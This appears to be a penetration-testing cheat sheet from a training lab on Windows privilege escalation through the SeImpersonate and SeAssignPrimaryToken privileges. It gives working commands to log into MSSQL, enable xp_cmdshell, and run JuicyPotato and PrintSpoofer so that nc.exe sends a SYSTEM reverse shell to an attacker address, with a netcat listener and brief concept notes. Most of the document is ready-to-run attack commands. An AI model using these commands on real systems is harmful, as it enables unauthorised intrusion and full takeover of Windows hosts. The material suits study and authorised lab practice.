# SeImpersonate and SeAssignPrimaryToken

## MSSQL Privilege Escalation

```bash
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```

## Enable xp_cmdshell

```sql
enable_xp_cmdshell
```

## Execute Commands

```sql
xp_cmdshell whoami
xp_cmdshell whoami /priv
```

## Exploit With JuicyPotato

```sql
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

## Listener

```bash
nc -lnvp 8443
```

## Exploit With PrintSpoofer

```sql
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

## Key Concepts
* **SeImpersonate**
  * Allows a process to impersonate tokens presented to it.
  * Commonly abused in “Potato” attacks that coerce privileged services to authenticate to controlled endpoints.

* **SeAssignPrimaryToken**
  * Allows assigning a different primary token to a process.
  * Useful for creating processes under another user’s security context.

* **Token Impersonation**
  * Windows processes run using access tokens.
  * If a process can obtain or coerce a SYSTEM token, it can escalate privileges.

* **Privilege Escalation via Service Accounts**
  * MSSQL, IIS, and other service accounts often run with impersonation-related privileges.
  * If you gain code execution (e.g., via xp_cmdshell), you can exploit these privileges.

* **JuicyPotato**
  * Exploits COM service misconfigurations to impersonate SYSTEM.
  * Requires `SeImpersonate` or `SeAssignPrimaryToken`.
  * Does **not** work on Windows 10 1809+ / Server 2019+.

* **PrintSpoofer**
  * Modern replacement for JuicyPotato.
  * Exploits the Print Spooler RPC impersonation vector.
  * Works on newer builds where JuicyPotato is patched.

* **MSSQL Exploitation**
  * `mssqlclient.py` enables SQL authentication with Windows auth.
  * `xp_cmdshell` provides command execution where enabled.

* **Reverse Shells**
  * Netcat listener waits for incoming SYSTEM shell.

